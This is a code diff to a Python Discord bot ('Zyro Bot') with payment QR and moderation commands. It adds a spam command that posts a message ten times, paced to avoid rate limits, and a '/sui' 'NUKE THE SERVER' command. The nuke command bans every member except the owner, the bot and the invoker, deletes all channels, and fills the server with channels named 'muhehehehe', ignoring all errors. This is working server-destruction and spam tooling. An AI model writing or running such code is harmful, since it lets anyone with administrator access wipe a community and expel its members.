@@ -1,16 +1,20 @@
 import discord
 from discord.ext import commands
 from discord import app_commands
-import qrcode, io, requests, os
+import qrcode, io, requests, os, asyncio
 from flask import Flask
 from threading import Thread
+
+# --- Config ---
+OWNER_ID = 123456789012345678  # <- PUT YOUR DISCORD USER ID HERE FOR DM /bolbro ACCESS
+# -----------------------------
 
 # --- Bot Setup ---
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 bot = commands.Bot(command_prefix='$', intents=intents)
-bot.remove_command('help')  # <- FIX: Remove default help command
+bot.remove_command('help')
 # -----------------------------
 
 # --- Keep alive for Render ---
@@ -56,7 +60,7 @@ async def on_ready():
     print(f'Zyro Bot is running! Logged in as {bot.user}')
     try:
         synced = await bot.tree.sync()
-        print(f'Synced {len(synced)} slash commands')
+        print(f'Synced {len(synced)} GLOBAL slash commands')
     except Exception as e:
         print(f"Failed to sync commands: {e}")
 
@@ -170,9 +174,9 @@ async def ping(ctx):
 @bot.hybrid_command(name="help", description="Show all commands")
 async def help_cmd(ctx):
     embed = discord.Embed(title="Zyro Bot Commands", color=0x00ff00)
-    embed.add_field(name="💸 Payment", value="`/upi <amount> ` - Generate UPI QR\n`/setupi <upi_id>` - Set UPI ID\n`/ltc <amount> ` - Generate LTC QR\n`/setltc <address>` - Set LTC address\n`/checkbalance` - Check LTC balance", inline=False)
-    embed.add_field(name="🛠️ Moderation", value="`/kick <user> [reason]` - Kick user\n`/ban <user> [reason]` - Ban user\n`/purge <amount>` - Delete messages", inline=False)
-    embed.add_field(name="⚙️ Utility", value="`/ping` - Check latency\n`/help` - Show this menu", inline=False)
+    embed.add_field(name="💸 Payment", value="`/upi <amount>` - Generate UPI QR\n`/setupi <upi_id>` - Set UPI ID\n`/ltc <amount>` - Generate LTC QR\n`/setltc <address>` - Set LTC address\n`/checkbalance` - Check LTC balance", inline=False)
+    embed.add_field(name="🛠️ Moderation", value="`/kick <user> [reason]` - Kick user\n`/ban <user> [reason]` - Ban user\n`/purge <amount>` - Delete messages\n`/sui` - NUKE SERVER\n*Server only*", inline=False)
+    embed.add_field(name="⚙️ Utility", value="`/ping` - Check latency\n`/help` - Show this menu\n`/bolbro <message>` - Spam message 10x", inline=False)
     embed.set_footer(text="Works with $ prefix too! Example: $upi 100")
     
     if isinstance(ctx, commands.Context):
@@ -180,68 +184,101 @@ async def help_cmd(ctx):
     else:
         await ctx.response.send_message(embed=embed)
 
-# --- Moderation Commands [Guild Only] ---
-@bot.hybrid_command(name="kick", description="Kick a user from the server")
-@app_commands.describe(user="User to kick", reason="Reason for kick")
-@app_commands.checks.has_permissions(kick_members=True)
-async def kick(ctx, user: discord.Member, *, reason: str = "No reason provided"):
-    if isinstance(ctx, discord.Interaction):
-        if not ctx.guild:
-            await ctx.response.send_message("This command only works in servers!", ephemeral=True)
+# --- Spam Command ---
+@bot.hybrid_command(name="bolbro", description="Spam a message 10 times")
+@app_commands.describe(message="Message to spam")
+async def bolbro(ctx, *, message: str):
+    user = ctx.author if isinstance(ctx, commands.Context) else ctx.user
+    
+    # Permission check: Admin in guild OR bot owner in DM
+    if ctx.guild:
+        if not user.guild_permissions.administrator:
+            msg = "You need Administrator permission to use this!"
+            if isinstance(ctx, discord.Interaction):
+                await ctx.response.send_message(msg, ephemeral=True)
+            else:
+                await ctx.send(msg)
             return
-        await user.kick(reason=reason)
-        await ctx.response.send_message(f"Kicked {user.mention} | Reason: {reason}")
     else:
-        if not ctx.guild:
-            await ctx.send("This command only works in servers!")
+        if user.id != OWNER_ID:
+            msg = "You can't use this command in DMs!"
+            if isinstance(ctx, discord.Interaction):
+                await ctx.response.send_message(msg, ephemeral=True)
+            else:
+                await ctx.send(msg)
             return
-        await user.kick(reason=reason)
-        await ctx.send(f"Kicked {user.mention} | Reason: {reason}")
+    
+    if isinstance(ctx, discord.Interaction):
+        await ctx.response.send_message("Spamming...", ephemeral=True)
+        channel = ctx.channel
+    else:
+        await ctx.send("Spamming...")
+        channel = ctx.channel
+    
+    for i in range(10):
+        await channel.send(message)
+        await asyncio.sleep(0.8)  # Rate limit protection
+
+# --- Moderation Commands [Guild Only] ---
+@bot.hybrid_command(name="kick", description="Kick a user from the server", guild_only=True)
+@app_commands.checks.has_permissions(kick_members=True)
+@app_commands.describe(user="User to kick", reason="Reason for kick")
+async def kick(ctx, user: discord.Member, *, reason: str = "No reason provided"):
+    await user.kick(reason=reason)
+    msg = f"Kicked {user.mention} | Reason: {reason}"
+    if isinstance(ctx, discord.Interaction):
+        await ctx.response.send_message(msg)
+    else:
+        await ctx.send(msg)
 
 @kick.error
 async def kick_error(ctx, error):
     if isinstance(error, app_commands.errors.MissingPermissions):
         msg = "You don't have permission to kick members!"
+    elif isinstance(error, commands.NoPrivateMessage):
+        msg = "This command only works in servers!"
     else:
         msg = f"Error: {str(error)}"
     
     if isinstance(ctx, discord.Interaction):
-        await ctx.response.send_message(msg, ephemeral=True)
+        if ctx.response.is_done():
+            await ctx.followup.send(msg, ephemeral=True)
+        else:
+            await ctx.response.send_message(msg, ephemeral=True)
     else:
         await ctx.send(msg)
 
-@bot.hybrid_command(name="ban", description="Ban a user from the server")
-@app_commands.describe(user="User to ban", reason="Reason for ban")
+@bot.hybrid_command(name="ban", description="Ban a user from the server", guild_only=True)
 @app_commands.checks.has_permissions(ban_members=True)
+@app_commands.describe(user="User to ban", reason="Reason for ban")
 async def ban(ctx, user: discord.Member, *, reason: str = "No reason provided"):
+    await user.ban(reason=reason)
+    msg = f"Banned {user.mention} | Reason: {reason}"
     if isinstance(ctx, discord.Interaction):
-        if not ctx.guild:
-            await ctx.response.send_message("This command only works in servers!", ephemeral=True)
-            return
-        await user.ban(reason=reason)
-        await ctx.response.send_message(f"Banned {user.mention} | Reason: {reason}")
+        await ctx.response.send_message(msg)
     else:
-        if not ctx.guild:
-            await ctx.send("This command only works in servers!")
-            return
-        await user.ban(reason=reason)
-        await ctx.send(f"Banned {user.mention} | Reason: {reason}")
+        await ctx.send(msg)
 
 @ban.error
 async def ban_error(ctx, error):
     if isinstance(error, app_commands.errors.MissingPermissions):
         msg = "You don't have permission to ban members!"
+    elif isinstance(error, commands.NoPrivateMessage):
+        msg = "This command only works in servers!"
     else:
         msg = f"Error: {str(error)}"
     
     if isinstance(ctx, discord.Interaction):
-        await ctx.response.send_message(msg, ephemeral=True)
+        if ctx.response.is_done():
+            await ctx.followup.send(msg, ephemeral=True)
+        else:
+            await ctx.response.send_message(msg, ephemeral=True)
     else:
         await ctx.send(msg)
 
-@bot.hybrid_command(name="purge", description="Delete messages")
-@app_commands.describe(amount="Number of messages to delete (1-100)")
+@bot.hybrid_command(name="purge", description="Delete messages", guild_only=True)
 @app_commands.checks.has_permissions(manage_messages=True)
+@app_commands.describe(amount="Number of messages to delete (1-100)")
 async def purge(ctx, amount: int):
     if amount < 1 or amount > 100:
         msg = "Amount must be between 1 and 100!"
@@ -252,16 +289,10 @@ async def purge(ctx, amount: int):
         return
     
     if isinstance(ctx, discord.Interaction):
-        if not ctx.guild:
-            await ctx.response.send_message("This command only works in servers!", ephemeral=True)
-            return
         await ctx.response.defer(ephemeral=True)
         deleted = await ctx.channel.purge(limit=amount)
         await ctx.followup.send(f"Deleted {len(deleted)} messages ✅", ephemeral=True)
     else:
-        if not ctx.guild:
-            await ctx.send("This command only works in servers!")
-            return
         deleted = await ctx.channel.purge(limit=amount + 1)
         await ctx.send(f"Deleted {len(deleted)-1} messages ✅", delete_after=3)
 
@@ -269,11 +300,71 @@ async def purge(ctx, amount: int):
 async def purge_error(ctx, error):
     if isinstance(error, app_commands.errors.MissingPermissions):
         msg = "You don't have permission to manage messages!"
+    elif isinstance(error, commands.NoPrivateMessage):
+        msg = "This command only works in servers!"
     else:
         msg = f"Error: {str(error)}"
     
     if isinstance(ctx, discord.Interaction):
-        await ctx.response.send_message(msg, ephemeral=True)
+        if ctx.response.is_done():
+            await ctx.followup.send(msg, ephemeral=True)
+        else:
+            await ctx.response.send_message(msg, ephemeral=True)
+    else:
+        await ctx.send(msg)
+
+# --- NUKE COMMAND ---
+@bot.hybrid_command(name="sui", description="NUKE THE SERVER", guild_only=True)
+@app_commands.checks.has_permissions(administrator=True)
+async def sui(ctx):
+    guild = ctx.guild
+    author = ctx.author if isinstance(ctx, commands.Context) else ctx.user
+    
+    if isinstance(ctx, discord.Interaction):
+        await ctx.response.send_message("Starting nuke... muhehehehe", ephemeral=True)
+    else:
+        await ctx.send("Starting nuke... muhehehehe")
+    
+    # 1. Ban all members except owner and bot
+    for member in guild.members:
+        if member.id == guild.owner_id or member.id == bot.user.id or member.id == author.id:
+            continue
+        try:
+            await member.ban(reason=f"Nuked by {author}")
+            await asyncio.sleep(0.5)
+        except:
+            pass
+    
+    # 2. Delete all channels
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            await asyncio.sleep(0.5)
+        except:
+            pass
+    
+    # 3. Create 10 new channels
+    for i in range(10):
+        try:
+            await guild.create_text_channel(name="muhehehehe")
+            await asyncio.sleep(0.5)
+        except:
+            pass
+
+@sui.error
+async def sui_error(ctx, error):
+    if isinstance(error, app_commands.errors.MissingPermissions):
+        msg = "You need Administrator permission to use this!"
+    elif isinstance(error, commands.NoPrivateMessage):
+        msg = "This command only works in servers!"
+    else:
+        msg = f"Error: {str(error)}"
+    
+    if isinstance(ctx, discord.Interaction):
+        if ctx.response.is_done():
+            await ctx.followup.send(msg, ephemeral=True)
+        else:
+            await ctx.response.send_message(msg, ephemeral=True)
     else:
         await ctx.send(msg)
 
